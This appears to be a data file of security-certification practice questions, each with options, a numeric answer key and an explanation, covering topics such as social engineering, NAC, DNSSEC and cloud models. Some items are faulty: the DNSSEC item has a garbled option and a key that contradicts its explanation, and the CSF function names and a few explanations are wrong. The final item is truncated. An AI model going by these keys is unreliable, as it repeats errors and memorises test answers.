{ 'question': '  Mary receives several calls asking to talk to Sue. But since Mary doesn’t know Sue, she asks if she can help them instead. The caller asks for odd information, but as soon as Mary starts to question why they want to know, they hang up. Mary mentions this to other co-workers, and many of them report getting similar calls. What is taking place at this organization? ','answers': ['Social networking attacks','Smishing','Social engineering','Resource exhaustion',],
'correct':3,'explanation': 'This is an example of a social engineering pre-text attack where the victim, Mary, is asked about a co-worker Sue (who doesn’t actually exist). This is put Mary in a mindset that might be more willing to help the caller by providing answers to questions, since the person they asked to talk to is either not there or unknown. This is not an example of a social networking or social media attack. Smishing would involve SMS text messaging, not phone calls. This attack is not involving resource exhaustion; that would be a DoS.',},
{ 'question': '  What tool or process is used during evidence collection to acquire data so that the collected data is an exact copy of the original? ','answers': ['Hashing','eDiscovery','Legal hold','Bitstream copy',],
'correct':4,'explanation': 'A bitstream copy is used to make an exact copy of data from its original location to a new target location. This can be verified using hashing, but hashing itself does not make the exact copy. eDiscovery is a business framework to be prepared to handle the collection and sharing of digital evidence. Legal hold is a notice to a data custodian that specific data or information must be preserved and that good-faith efforts must be engaged to preserve the indicated evidence.',},
{ 'question': '  A worker attempts to use a 15-year-old laptop under the BYOD policy of his organization. When connecting to the company WiFi network, it shows connectivity, but there is no network access. The network admin confirms that the WAP is requiring WPA3. No other worker is reporting a problem with their mobile device. What is the cause of this connection problem? ','answers': ['The WAP’s antennae are disconnected.','The DHCP has a reservation for the MAC address of the laptop.','DLP is blocking access.','The laptop supports only WEP and WPA.',],
'correct':4,'explanation': 'The likely issue is that the old laptop does not support WPA3 and might only support WEP and WPA. This would allow for the wireless connection to be established, but without encryption no communications are being allowed to occur across or through the WAP. If the WAP’s antennae were disconnected, other workers might have complained about connectivity, plus the old laptop is getting a radio signal connection. A DHCP reservation would not affect network connectivity, as it would specifically reserve an IP address configuration for the specific device. DLP is not usually related to WiFi connectivity; it is more typically used to block application features or external data transfers that breach confidentiality restrictions.',},
{ 'question': '  After checking into your hotel room, you attempt to connect to the Internet over the free WiFi network. You are prompted by a hotel logo screen to agree to terms of service and provide both your room number and your last name. Once you complete the request, you are able to access the Internet. What is this procedure known as? ','answers': ['Captive portal','Onboarding','DHCP reservation','Formal enrollment',],
'correct':1,'explanation': 'A captive portal is an authentication technique that redirects a newly connected wireless web client to a portal access control page. The portal page may require the user to input payment information, provide logon credentials, or input an access code. Onboarding is integrating a new device or worker into the company security policy. DHCP reservation is pre-allocating an IP address for a system by associating it with a MAC address. Formal enrollment is the process of recording the reference profile of a body part for use as a biometric authentication factor (i.e., something you are).',},
{ 'question': '  An organization wants to prevent the use of jailbroken or rooted devices on its internal network. Which of the following MDM applied restrictions would enforce this security policy? ','answers': ['Install a spyware scanning tool.','Require all apps be digitally signed.','Define geofencing parameters.','Set push notifications.',],
'correct':2,'explanation': 'From this list of options, only the requirement for all apps to be digitally signed would be effective. Most jailbreaking and rooting applications are not digitally signed as they are often a hack or in violation of terms of service of the mobile OS. Thus, if no unsigned apps are allowed to run, then these tools can’t be used to jailbreak or root the devices, and then MDM secured devices will not be rooted or jailbroken when on the company network. A spyware scanning tool, geofencing, and push notifications do not affect whether a device is rooted or jailbroken.',},
{ 'question': '  ___________ is a tool used to determine privacy risks, how to mitigate those risks, and whether to notify the affected parties as related to a new or future project or endeavor. ','answers': ['PTA','PIA','EULA','Privacy notice',],
'correct':2,'explanation': 'A privacy impact assessment (PIA) is a tool used to determine privacy risks, how to mitigate those risks, and whether to notify the affected parties as related to a new or future project or endeavor. A privacy threshold assessment (PTA) is used to evaluate the data that an organization has already collected to determine whether such data is PII, business confidential, or nonsensitive data. Terms of agreement, end-user license agreement (EULA), a contract, or a service-level agreement (SLA) is a document that defines the rules and restrictions of using a product, website, or service. A privacy notice is typically an externally facing document informing customers, users, or stakeholders about that the organization does with PII. This is also considered a privacy statement.',},
{ 'question': '  A CISO needs to learn about threats that are targeting his organization. Several similar organizations have experienced breaches and intrusions in the last month. The CISO is justly concerned that an attack on his organization is imminent. What should the CISO do to improve the security posture quickly? ','answers': ['Enroll all employees in a social engineering awareness training program.','Restrict all digital certificates to have a 1-year expiration instead of 10-years.','Perform an internal audit to verify that all deployed systems are in compliance with the company security policy.','Access threat intelligence feeds from an industry specific service.',],
'correct':4,'explanation': 'At this point, the CISO needs to know more about the specific threats that he is facing. Barring communicating with those companies that have already been breached, the next best source of information is threat intelligence feeds from an industry specific service. The knowledge gained from such a threat feed will inform the CISO specifically of the most likely attacks he could be facing, which in turn allows them to focus on deploying defenses against those specific threats. A social engineering awareness training program is often a good idea, but it is not targeted for this situation. In this scenario, the CISO doesn’t know what the threats are, so this response may or may not be appropriate. The reduction of certificate expiration length from 10 years to 1 year is not necessarily a good or bad security measure, but it is also not necessarily the right solution in this scenario. Generally, certificates should be replaced if there has been a breach that could have subjected the correlated private key to theft. If using current standards, a 10- year expiration is actually more secure than a 1-year expiration certificate since as of early 2020, 1-year certificates are typically issued using 2048-bit RSA keys, while certificates longer than 1 year are issued using 4096-bit RSA keys. At this point in the book, I have not covered certificates and encryption in detail, but that shouldn’t matter here. The response is an assumption of the threat, thus not the best choice in this situation. This will be another common occurrence on the exam, where several answers may be solid security measures, but just not specific or appropriate for the issue being brought up by the question. Performing an internal audit will not improve the security posture unless the deployed infrastructure was not matching the policy, but even then it will only bring it up to the level that the current security policy was designed to establish. It will not include the new threats that the CISO is not currently aware of, but needs to be.',},
{ 'question': '  Dorothy sees an announcement on her computer screen stating that she has been detected performing illegal activities. The message claims that her files have been encrypted to protect them for use as evidence in her prosecution. A phone number is presented, and she is encouraged to call to discuss options. When she calls, after reading off an ID code off the screen, the person on the phone requests that she pay a fee to avoid prosecution. What has Dorothy experienced? ','answers': ['Keylogger','Command and control','Rainbow table attack','Ransomware',],
'correct':4,'explanation': 'Dorothy has been the victim of ransomware. The key items here are a pop-up display of the event, encryption of her files, and demands for payment. The rest of the situation is the pretext or situational lie used to give context and make the event seem more dire to convince the victim to pay the demanding funds. This situation did not describe the presence of a keylogger, command and control (which is related to botnets), nor rainbow table attacks (which is related to password hash cracking attempts).',},
{ 'question': '  What threat agent represent the MOST risk to a security-mature organization based on their access and knowledge? ','answers': ['Script kiddies','Insiders','Competitors','APT',],
'correct':2,'explanation': 'The threat agent represents the MOST risk to an organization based on their access and knowledge are the insiders. An insider already has both logical and physical access to the company resources, and they have knowledge of how the organization operates, its processes, procedures, policies, politics, and social relationships. An insider can decide to break the rules and purposely introduce malicious code or reduce security for their own benefit or gain. Script kiddies are much less of a risk than insiders. If an insider is a script kiddie, then we consider them an insider threat. An external script kiddie has to be lucky to have access to an exploit that takes advantage of a vulnerability that the organization has not dealt with, which is unlikely if they are securitymature. A competitor may have more knowledge about an organization than a random external hacker, but often only superficially. A competitor is less of a risk than an insider to a security-mature organization. An APT group may at first seem like the threat agent presenting the most risk, but even an APT group has to first gain logical or physical access to a target. While they may have money, time, and a high-level of skill, they still have to find and successfully exploit a weakness to gain access and cause harm. A security-mature organization will have reduced the chance of success by an APT group (although not eliminate it), so an insider still represents the greatest risk to even a security-mature organization.',},
{ 'question': '  Certificates operate under the security concept of __________. ','answers': ['Principle of least privilege','Trusted third party','Separation of duties','Need to know',],
'correct':2,'explanation': 'Certificates operate under the security concept of trusted third party. Certificates aren’t associated with the principle of least privilege, separation of duties, or need to know.',},
{ 'question': '  A web server has been compromised by a SQL injection attack. The developers are confused as they had implemented a filter in HTML to only allow letters and numbers to be submitted by visitors. What security feature would have prevented this compromise? ','answers': ['Version control','Server-side validation','Patch management','Client-side validation',],
'correct':2,'explanation': 'The missing security feature in this scenario is server-side validation. The question describes client-side validation, but that is insufficient to prevent submission of unwanted content. All input should be sanitized by the server prior to processing. Version control is good system and security practice, but it does not specifically address this issue. Patch management is also good security management, but it is also not specific to this issue.',},
{ 'question': '  A worker in the human resources department is researching options for improving the efficiency of tax preparation and filing. A potential solution provider offered to perform an initial processing of data to demonstrate their capabilities. The HR worker crafted an email with an attachment including the details of employees, their salaries, and other relevant business tax information. Immediately after sending this material, an email with the following message was received: “Your communication has been quarantined and not delivered to the intended recipient. The contents of the message were in violation of a company policy: PII disclosure to external entities. Please contact the IT and security staff for more information.” What is the MOST likely reason for this message? ','answers': ['The DLP system intercepted the message.','A personal email address was being used as the destination and therefore was blocked by the email gateway.','The WAF blocked the communication due to a malware threat.','The attached files failed a hash integrity check.',],
'correct':1,'explanation': 'The most likely reason for the message is that the DLP system intercepted the message since it was exposing PII of employees and confidential company information to an external entity. The message clearly indicates that the issue was due to potential PII exfiltration, so it is not related to a personal email address, a WAF detected malware threat, nor a hash integrity check. While an email gateway might filter certain email messages with specific restricted content from being sent to a noncorporate email address, that would still be a DLP system. A WAF only filters web communications, so it would not be involved with email messages. A file hash integrity check might be performed on files leaving the network to prevent steganography hidden items from being leaked, but this is also a DLP function.',},
{ 'question': '  Which of the following is an example of a corrective control? ','answers': ['System imaging','Mandatory vacation','Separation of duties','Post-incident review',],
'correct':4,'explanation': 'Post-incident review is an example of a corrective control. System imaging is an example of a recovery control. Mandatory vacation is an example of a detective control. Separation of duties is an example of a preventive control.',},
{ 'question': '  When lighting is used in the parking garage and at each building doorway, what security control concept is in use? ','answers': ['Deterrent','Detective','Preventive','Corrective',],
'correct':1,'explanation': 'Lighting is a deterrent control. Lightning on its own is not detective, preventive, or corrective. However, when combined with cameras, automated systems, and/or security guides, lighting can support and improve these other forms of security controls.',},
{ 'question': '  The CISO has put out a call for proposals from a variety of vendors to provide a certificate solution for the company. You have reviewed the RFP and see that significant changes will be necessary to almost every aspect of business operation, including device, application, and user access to resources. Certificates are used for what primary purpose? ','answers': ['Prove reliability','Prove compatibility','Prove identity','Prove timeliness',],
'correct':3,'explanation': 'Certificates are primarily used to prove identity. Certificates are implemented in a trusted third-party authentication system. Certificates can’t prove reliability, compatibility, or timeliness.',},
{ 'question': '  A company has been the victim of business email compromise. The primary manager in the accounting department paid a fraudulent invoice for 132,000. She did so based upon the instructions sent to her in a message received from the CEO’s email address. What social engineering principle was used in this situation? ','answers': ['Tailgating','Authority','Scarcity','Familiarity',],
'correct':2,'explanation': 'BEC is often performed by taking advantage of the social engineering principle of authority. The false invoice, which was apparently received from the CEO, makes it seem like it originated from a proper authority. Tailgating is the abuse of someone’s access into a system or facility without their consent or knowledge for an unauthorized person to intrude. Tailgating is not a social engineering principle. Scarcity is the social engineering principle of limited opportunity, which was not used in this situation. Familiarity is the social engineering principle of establishing or perceiving similarity, which was not used in this situation.',},
{ 'question': '  A recent security intrusion took place when an attacker was able to log into a valid user account of an employee. Since there were no failed logon attempts prior to the intrusion, the investigator thinks the attacker collected the credentials when the user accessed the company email servers over the Internet. What tool can the investigator use to determine if logging into the email server is occurring in plaintext? ','answers': ['Wireshark','memdump','Autopsy','theHarvester',],
'correct':1,'explanation': 'Wireshark is a network sniffer; it can collect network traffic of users logging into the email server, and then the operator can view the packets to determine if the payload of credentials is in plaintext. The memdump utility extracts memory/RAM contents into a standard output stream, which can be captured into a file. Autopsy is a free-to-use graphical interface to The Sleuth Kit (TSK) and other forensic tools, which focuses on storage device analysis rather than network traffic. The theHarvester tool is used for OSINT gathering.',},
{ 'question': '  What should a DevOps manager verify or do before releasing code from the developers into the production environment? ','answers': ['Code size','Activate rollback','Hashes','Roll out system images',],
'correct':3,'explanation': 'Before releasing any code into production, the DevOps manager should verify the hashes of the files to be released. This is to ensure that only the actual final, tested, and approved version of files is released and that those files were not corrupted or infected with malware prior to distribution. The size of the code is not as relevant as the hashes, although a change in the size of code would result in a change in the hash value. Activating rollback is performed only if a deployment goes bad and systems need to be restored to their pre-rollout state. System images do not need to be rolled out or installed prior to installing or distributing new software. Doing so would likely result in lost data, customizations, and configurations performed on those systems since the previous system image update.',},
{ 'question': '  Several bank customers have reported numerous unrecognized withdrawals from their account. An account manager has recently purchased a new car, is showing off flashy jewelry, and has been buying lunch for the entire department. To discover evidence of fraud and theft, which of the following could be used? ','answers': ['Offboarding','Gamification','MOU','Mandatory vacation',],
'correct':4,'explanation': 'In this scenario, mandatory vacation is the most likely means to discover evidence of fraud and theft. Offboarding is used to terminate an employee using a formal procedure, not for collecting evidence of violations. Gamification is a means to encourage compliance and engagement by integrating common elements of game play into other activities. It is more often used to encourage compliance rather than discover violations. A memorandum of understanding (MOU) or memorandum of agreement (MOA) is an expression of agreement or aligned intent, will, or purpose between two entities and thus not relevant to this scenario.',},
{ 'question': '  What technology allows for a record of events to be created in such a way that it is not possible for anyone to modify or alter a historical entry without it being noticed? ','answers': ['Blockchain','Hashing','Post-quantum encryption','Salting',],
'correct':1,'explanation': 'A blockchain is a collection or ledger of records, transactions, operations, or other events that are verified using hashing, timestamps, and transaction data. Each time a new element is added to the record, the whole ledger is hashed again. This system prevents abusive modification of the history of events by providing proof of whether the ledger has retained its integrity. Hashing on its own is insufficient as it is a general means to check for integrity violations, but hashing is not itself a means of record keeping. Post-quantum is the study and creation of cryptographic algorithms to defend against quantum supremacy in the area of encryption and thus is not relevant here. Salting is a value added to passwords prior to hashing to defend against password cracking and thus is not relevant here.',},
{ 'question': '  Your US-based organization experienced a breach several months ago, but only just discovered it. Preliminary information reveals that the intruder was able to access the customer database. You have many customers from Europe, so you are needing to be compliance with GDPR disclosure. What is the time frame allowed to notify the EU regional authorities of this issue? ','answers': ['72 hours.','24 hours.','Three weeks.','There is no requirement for non-EU companies.',],
'correct':1,'explanation': 'The GDPR has a 72-hour notification deadline of privacy breach incidents once discovered/uncovered that applies to any organization worldwide if they hold PII of EU citizens. The other options are incorrect.',},
{ 'question': '  An organization wants to use a wireless network internally, but they do not want any possibility of external access or detection. What security tool should be used? ','answers': ['Airgap','Faraday cage','Biometric authentication','Screen filters',],
'correct':2,'explanation': 'A Faraday cage is an enclosure that blocks or absorbs electromagnetic fields or signals. Faraday cage containers, computer cases, rack-mount systems, rooms, or even building materials are used to create a blockage against the transmission of data, information, metadata, or other emanations from computers and other electronics. Devices inside a Faraday cage can use EM fields for communications, such as wireless or Bluetooth, but devices outside of the cage will not be able to eavesdrop on the signals of the systems within the cage.',},
{ 'question': '  The company is improving its mobile device security requirements to require the following: Remote wiping Geolocation tracking Software control Storage segmentation Patch management Installation of a firewall and antivirus Forced timed screen lock Forced storage encryption Prevention of swipe and pattern unlock Which of the following should be implemented to meet these requirements? ','answers': ['NFC','BYOD','WAP','MDM',],
'correct':4,'explanation': 'An MDM can be used to enforce these security requirements on all devices used by employees on the company network. NFC can be used on a mobile device, but it is not used to enforce security features. BYOD may define security functions that are desired on mobile devices, but a BYOD as a policy does not enforce them. Additionally, a device brought in under BYOD might not support all of the required security features. A WAP can enforce WiFi communication encryption and strong authentication, but does not otherwise enforce on-device security features.',},
{ 'question': '  An organization is concerned that boot malware may infect its systems. What new technology is available on some motherboards that can reduce this risk? ','answers': ['SED','TPM','BIOS','UEFI',],
'correct':4,'explanation': 'A replacement or improvement to BIOS is Unified Extensible Firmware Interface (UEFI). UEFI provides support for all of the same functions as that of BIOS with many improvements, such as support for larger hard drives (especially for booting), faster boot times, enhanced security features, and even the ability to use a mouse when making system changes. Secure boot is a feature of UEFI that aims to protect the operating environment of the local system by preventing the loading or installing of device drivers or an operating system that is not signed by a preapproved digital certificate. Secure boot thus protects systems against a range of low-level or boot-level malware, such as certain rootkits and backdoors. Self-encrypting drive (SED) does not protect against boot malware; it only protects data in storage when the drive is not actively being used. The trusted platform module (TPM) is both a specification for a cryptoprocessor and the chip in a mainboard supporting this function. The TPM is often used to store FDE keys, but does not directly protect against boot malware. Basic input/output system (BIOS) is the legacy basic low-end firmware or software embedded in a motherboard. It is vulnerable to boot malware.',},
{ 'question': '  High availability is an essential requirement of the mission critical servers of the organization. Which of the following should be the focus of the implementation team to optimize for this requirement? ','answers': ['Whole-drive encryption','Off-site storage','HVAC','Secure bootloader',],
'correct':3,'explanation': 'In this scenario, the only offered option that relates to high availability is HVAC. Systems need to be maintained at reasonable temperatures and humidity levels along with good airflow to avoid related causes of system failures, such as heat buildup, condensation, or static discharge. Whole-drive encryption is a protection for confidentiality, not availability. Off-site storage of backups is to prevent a major disaster from destroying all copies of company data and to provide a viable option for data recovery. While backups are generally considered an availability protection, they are more of a last line of defense option to restore availability than to maintain high availability. A secure bootloader is needed to prevent malware infections, such as rootkits that are initiated upon system boot, but this is not relevant to high availability as system reboots are to be avoided.',},
{ 'question': '  Malware that does not leave any trace of its presence nor saves itself to a storage device, but is still able to stay resident and active on a computer, is known as what? ','answers': ['Rootkit','Cryptomalware','Fileless malware','Spyware',],
'correct':3,'explanation': 'Malware that leaves no trace of its presence nor saves itself to a storage device, but is still able to stay resident and active on a computer is fileless malware. This is similar to a rootkit, which can be described as an invisibility shield. But its core features are that it interferes with low-level communications of the operating environment to hide itself and then hide other things, such as files and/or processes. A rootkit is usually deposited on a system as a file that is then executed upon system load or application launch. Cryptomalware installs a cryptominer on a victim system. Spyware collects information about the system user.',},
{ 'question': '  A recent DDoS attack kept several ecommerce platforms offline for hours. Analysis of the attack has determined that most of the traffic originated from home automation equipment, IP cameras, and even medical equipment. Each of these systems were using a common OS extension which had a vulnerability that was exploited to plant the botnet agent code. A patch was released by the vendors of these products to allow customers to update their devices. What type of equipment was being inappropriately accessed in this situation? ','answers': ['SoC','ICS','IoT','NGFW',],
'correct':3,'explanation': 'This scenario describes the botnet as running from devices that can be labeled as Internet of Things (IoT). This scenario does not describe devices that are system on chip (SoC), industrial control system (ICS), or next-generation firewall (NGFW).',},
{ 'question': '  Which of the following is not a desired feature set of a vulnerability scanner? ','answers': ['Intrusive or nonintrusive','Credentialed or noncredentialed','Being SCAP compliant','False positive or false negative',],
'correct':4,'explanation': 'A false positive occurs when an alarm or alert is triggered by benign or normal events. The problem with false positives is that they cause security administrators to waste time investigating nonmalicious events. Whereas a false positive is an alarm without a malicious event, a false negative is a malicious event without an alarm. When false negatives occur, it is assumed that only benign events are occurring; however, malicious activities are actually taking place. Desired features of a vulnerability scanner include supporting intrusive and nonintrusive scanning options, offering credentialed or noncredentialed scanning options, and being Security Content Automation Protocol (SCAP) compliant.',},
{ 'question': '  A 2,500 employee organization wants to migrate its IT infrastructure to the cloud. They want to allow the majority of employees to work from home. Their operations are of a sensitive nature and thus require exclusivity on the cloud systems. What cloud model should they access? ','answers': ['Community','IaaS','Private','SaaS',],
'correct':3,'explanation': 'This situation calls for a private cloud model. The organization’s need for exclusivity is the idea that they should be the only users of the equipment that is supporting their operations. This concept is known as single-tenant or a private cloud. This organization needs to avoid public and community clouds as they are multi-tenant. IaaS and SaaS are not relevant choices here as they do not indicate whether a cloud service is single or multi-tenant, as they can be implemented in either condition.',},
{ 'question': '  A security manager notices that each time he launches an application from his desktop, it takes upwards of 90 seconds before the application opens. But when he tries to open a document that must be viewed through the same application, it opens immediately. The manager inspects the shortcut on his desktop and sees that it points to a folder and filename executable that he doesn’t recognize. What is taking place in this situation? ','answers': ['War driving','Malware persistence','Privilege escalation','Ransomware',],
'correct':2,'explanation': 'This scenario describes potential malware that modified a shortcut to launch itself and then in turn (after the 90 second delay) launch the victimized application. This is an example of a means of persistence where a malware author attempts to keep his malicious code running (or getting re-executed often) on a victim system. This is not war driving, as that is a wireless network discovery operation. This is not specifically privilege escalation, although the malware may perform an escalation of privilege abuse, that is not referenced or alluded to in the scenario. This is not ransomware, as no demand for money took place, and ther is no indication of files going missing or being encrypted.',},
{ 'question': '  The CISO has tasks you with deploying a system that will automate the process of collecting and analyzing log and real-time data, evaluate this information in light of materials from threat intelligence sources, and then trigger responses to low and mid-level severity issues without the need for human involvement. The company has been focusing on reducing the burden of human response to lower-severity security issues, so the security teams can spend their time, energy, and focus on the more-severe security issues. What solution should you implement to fulfil these requirements? ','answers': ['RFID','SOAR','CVSS','SIEM',],
'correct':2,'explanation': 'Security orchestration, automation, and response (SOAR) is a collection of software solutions that can automate the process of collecting and analyzing log and real-time data, evaluate it in light of materials from threat intelligence sources, and then trigger response to low and mid-level severity issues without the need for human involvement. The goal of using SOAR is to reduce the burden of human response to lower-severity security issues, so the security teams can spend their time, energy, and focus on the more-severe security issues. Radio Frequency Identification (RFID) is a tracking technology based on the ability to power a radio transmitter using current generated in an antenna when placed in a magnetic field. Common Vulnerability Scoring System (CVSS) is an open framework for communicating the characteristics and severity of software vulnerabilities. A CVSS score can be represented as a vector string, a compressed textual representation of the values used to derive the score. CVSS is an element of Security Content Automation Protocol (SCAP), which is an effort led by the National Institute of Standards and Technology (NIST) to establish a standardized means to define and communicate security-related event and issue information. Security Information and Event Management (SIEM) is a centralized application to automate the monitoring of network systems. SIEM can use triggers or thresholds that oversee specific features, elements, or events that will send alerts or initiate alarms when specific values or levels are breached.',},
{ 'question': '  The CSO has filed a request for a new budgetary item to purchase access to threat intelligence sources for IoC, observables, and details of recent breach events. When questioned, the CSO states that these resources will help his security team improve their proactive and detective capabilities in regard to attacks, exploits, and intrusions targeting the organization. What type of service, system, or capability is the CSO attempting to establish? ','answers': ['Threat map','Criminal syndicate','Contributing to STIX and TAXII','Predictive analysis',],
'correct':4,'explanation': 'Predictive analysis aims to employ indicators of compromise (IoC), observables, and other cyber threat intelligence to determine when at attack is imminent. The earlier in the cyber kill chain that we can detect an attack, exploit, breach, or intrusion event, the more likely the malicious event will be deflected and stopped. A threat map is a real-time map of cyber-attacks that are taking place, mostly of issues across the Internet. This scenario does not seem to focus on general threat map data collection but on internal issue proactive detection and prevention. Criminal syndicates (aka organized crime) are involved in cybercrime activities because it is yet another area of exploitation that may allow criminals to gain access, power, or money, this is not the focus of this scenario nor the intention of this CSO. Structured Threat Information eXpression (STIX) is an effort to develop a standardized language and repetitional structure for the organization and dissemination of cyber threat indicators and related information. Trusted Automated eXchange of Intelligence Information (TAXII) is a standardized set of communication services, protocols, and message exchanges to support the effective communication and exchange of cyber threat indicators. The CSO in this scenario may be taking advantage of STIX and TAXII, but there is no indication that the system being implemented will be contributing back to a threat intelligence service.',},
{ 'question': '  An organization wants to improve the security of their DNS operations by implementing DNSSEC. Which of the following is most important to support this new security mechanism? ','answers': ['Which of the following is most important to support this new','HTTPS','HSM','LDAPS',],
'correct':4,'explanation': 'DNSSEC uses certificates to perform mutual authentication between DNS servers, and thus PKI is needed to provide and support those certificates. HTTPS is not involved in DNSSEC but is the basis for DoH. An HSM is not used in DNSSEC. LDAPS is not related to DNSSEC.',},
{ 'question': '  Your organization wants to integrate a biometric factor into the existing multifactor authentication system. To ensure alignment with company security priorities, what tool should be used in selecting the most accurate biometric device to use? ','answers': ['CER evaluation','OAuth verifier','Zephyr analysis chart','Federation assessment',],
'correct':1,'explanation': 'The two error measurements of biometric devices (FRR and FAR) can be mapped on a graph comparing sensitivity level to rate of errors. The point on this graph where these two rates intersect is known as the crossover error rate (CER). The CER point (as measured against the error scale) is used to determine which biometric device for a specific body part from various vendors or of various models is the most accurate. OAuth is related to federation of online web-based single sign-on, not biometrics. A Zephyr analysis chart presents the relative strengths and weaknesses of various characteristics of biometric factor options; it does not evaluate accuracy of a specific device, but of categories or types of biometric as a group. A federation assessment is related to linking separate authentication systems together to facilitate singles sign-on; it is related to evaluating biometric accuracy.',},
{ 'question': '  What type of attack enables a hacker to forcibly send messages to Bluetooth devices? ','answers': ['War driving','Bluejacking','IV attack','Bluesnarfing',],
'correct':2,'explanation': 'Bluejacking enables a hacker to forcibly send message to Bluetooth devices. War driving is used to detect wireless networks. Initiation vector (IV) attacks are used to crack Wired Equivalent Privacy (WEP) encryption. Bluesnarfing enables a hacker to read data from Bluetooth devices.',},
{ 'question': '  In 2014, National Institute of Standards and Technology (NIST) established the Cybersecurity Framework (CSF). As a private sector business, this prescription of security guidance can be used to improve the organization’s existing security structure. The CSF framework consists of five functions, which of the following is a list of those five functions? ','answers': ['Preventive, detective, corrective, deterrent, compensating, physical','Preparation, identification, containment, eradication, recovery, lessons learned','Reconnaissance, weaponization, delivery, exploitation, installation, command and control, actions on objectives','Identity, protect, detect, response, and recover',],
'correct':4,'explanation': 'The correct list of the five functions of the CSF are identity, protect, detect, response, and recover. The other options are incorrect as they are lists of other concepts. (A) Preventive, detective, corrective, deterrent, compensating, physical is the list of security control types/benefits/functions. (B) Preparation, identification, containment, eradication, recovery, lessons learned are the steps of an incident response plan. (C) Reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on objectives are the steps in the cyber kill chain.',},
{ 'question': '  The security team lead reviews a vulnerability scan report from an evaluation performed over the weekend by his team. He notices that the report lists a critical vulnerability in IIS that needs to be patched immediately. He also reviews the inventory of scanned systems and sees several firewalls, routers, switches, macOS clients, Linux servers, and Solaris servers. What should the security team lead do with this information? ','answers': ['Discard the critical finding as a false positive.','Have the security team patch IIS on the Linux and Solaris servers.','Install updates on all printers.','Share the results with the oversight regulators.',],
'correct':1,'explanation': 'This scenario is describing a false positive, so the critical finding should be discarded. The list of scanned systems do not include Windows Server, which is the only OS where IIS would be present. This is either a flaw of the scanner, a mis-identified threat code, or possibly a honeypot on a non-Windows OS providing mis-directing information. IIS is not supported and will not run on Linux nor Solaris, so there is no way to patch it either. The issue is about the Windows web server product, not related to printers. Updating printers may be a good security practice in general, but it is not relevant to the specifics of this scenario. Since this is a false positive, it does not need to be shared with anyone, especially oversight regulators. They should be provided only with a report of actual verified findings.',},
{ 'question': '  The CTO reviews the weeks network traffic report from the company’s border firewall. He notices a significant number of connections initiated by different internal systems, but connecting to the same external target. He also notices that the connections seem to occur exactly 15 minutes apart. What is the most likely cause of this concern? ','answers': ['Botnet','Skimming','RAT','PUP',],
'correct':1,'explanation': 'This situation is describing the possible network activity of botnet agents infecting internal systems. They may attempt to connect to their C&C for updates and instructions every 15 minutes. This is not an example of skimming (which relates to credit card cloning). This could be a RAT, but the fact that it is coming from multiple internal systems, occurs every 15 minutes, and is internally initiated makes it more likely a botnet agent infection than a remote access Trojan. A RAT would more likely only be infecting one primary target, may internally or externally initiated, and would probably not have an automated connection attempt at a fixed time interval. The present of a botnet agent is absolutely the presence of a PUP. But PUP is a more encompassing or collective term and not specific enough to this situation. This is a common feature of exam questions, so look for specific versus general (which can also be called parent/child or superset/subset) relationships between answer options.',},
{ 'question': '  When CHAP is used for authentication, how are the passwords transmitted from the client to the authentication server? ','answers': ['In hashed form','In clear text','As a ticket','Encrypted with AES',],
'correct':1,'explanation': 'Challenge-Handshake Authentication Protocol (CHAP) uses MD5 to hash passwords before transmission. Password Authentication Protocol (PAP) sends passwords in the clear. Kerberos uses tickets. Advanced Encryption Standard (AES) is an encryption algorithm that isn’t used by CHAP. CHAP does not send passwords in clear text; only the username and the computed response is sent in clear text. Tickets are a feature of Kerberos, not CHAP. CHAP does not encrypt with AES or any other symmetric algorithm; it only uses its own hashing-like algorithm to produce the client’s response from the password hash and the challenge number.',},
{ 'question': '  A nonprofit’s cloud services have been threatened by numerous attacks attributed to foreign APT groups. The attacks have not been successful, but additional security measures should be implemented to minimize the possibility of a breach or intrusion. The CSO thinks a NGSWG is needed to provide the specific security benefits to address this risk. Which of the following is a valid definition of this security concept? ','answers': ['The CSP maintains several copies of customer data in multiple locations (especially multiple zones).','The collection of technologies used to manage digital authentication credentials, such as password hashes, session and storage encryption keys, and digital certif','A cloud-based web gateway solution that is often tied to a subscription service that provides ongoing updates to filters and detection databases.','A VM, VDI, or VMI instance that serves as a virtual endpoint for accessing cloud assets and services.',],
'correct':3,'explanation': 'Next-generation secure web gateway (SWG or NGSWG) is a variation of and combination of the ideas of a next-generation firewall and a WAF. A SWG is a cloud-based web gateway solution that is often tied to a subscription service that provides ongoing updates to filters and detection databases. The remaining answers are incorrect. Replication is when (A) the CSP maintains several copies of customer data in multiple locations (especially multiple zones). Secrets management is (B) the collection of technologies used to manage digital authentication credentials, such as password hashes, session and storage encryption keys, and digital certificates. A virtual private cloud (VPC) endpoint is effectively (D) a VM, VDI, or VMI instance which serves as a virtual endpoint for accessing cloud assets and services.',},
{ 'question': '  The organization is using a NAC solution to cut down on unauthorized devices connecting to the network and reducing security compromises on authorized ones. The NAC is using a pre-admittance agent-based evaluation system. An employee who had been working remotely for three months has just returned to the office. However, after connecting to a known active network cable and booting, she discovers that her company issued endpoint device has no connectivity to the company LAN nor the Internet. What is the most likely cause for this situation? ','answers': ['Invalid WiFi drivers.','Quarantine.','She is using a personal device.','The VLAN membership is restricted.',],
'correct':2,'explanation': 'In this scenario, the most likely reason the endpoint device has no network access is it was quarantined by NAC. The scenario states the endpoint is company issued, so it is authorized. But with it being away from the LAN for three months, it is likely missing approved updates and required configuration changes. If these issues are resolved, NAC will return the system to the production network. The other options are not a relevant reason for the system’s connectivity issues. WiFi drivers are not involved with a working network cable connection. She is not using a personal device, as it is a company issued endpoint device. There is no mention of switches or VLANs (although switches can be assumed to be present in most company networks), so VLAN restrictions is not as likely especially since NAC was clearly emphasized in the scenario.',},
{ 'question': '  What hacker technique can be used over a network connection to discover the identity of services active on the open ports of a computer system? ','answers': ['Evil twin','Banner grabbing','Sniffing','ARP poisoning',],
'correct':2,'explanation': 'Banner grabbing may reveal the identity of a service when used against an open port across a network connection. Evil twin is an attack in which a hacker operates a false access point that will automatically clone, or twin, the identity of an access point based on a client device’s request to connect. Sniffing is used to collect network traffic to reveal the contents of the headers and nonencrypted payloads. Address Resolution Protocol (ARP) poisoning is used to trick a switch into rerouting traffic.',},
{ 'question': '  _______________ is the message sent to a certificate authority from a registration authority to trigger the issuance of a digital certificate. ','answers': ['SHA-1','OCSP','PKI','CSR',],
